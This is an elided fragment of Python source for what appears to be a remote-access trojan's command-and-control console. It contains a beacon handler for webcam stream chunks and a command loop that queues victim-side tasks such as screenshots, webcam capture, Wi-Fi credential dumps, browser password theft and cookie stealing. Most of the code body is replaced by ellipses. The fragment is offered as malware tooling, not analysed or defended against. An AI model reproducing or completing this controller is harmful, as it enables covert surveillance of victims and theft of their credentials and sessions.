...
def beacon():
    ...
    with lock:
        ...
        for res in results:
            ...
            elif output.startswith("SWEBCAM_STREAM_CHUNK:"):
                try:
...
def cli():
    ...
    while True:
        try:
            ...
            # Target-specific commands
            ...
            elif action in ["sysinfo", "get_logs", "installed_software", "list_webcams", "screenshot", "wifi_dump", "wifi_scan", "browser_pass", "cookie_steal"]:
                ...
                print(f"[>] {action} task queued")
                    ...
                    add_task(current, cmd_input.strip(), "")
                    print(f"[>] webcam queued")
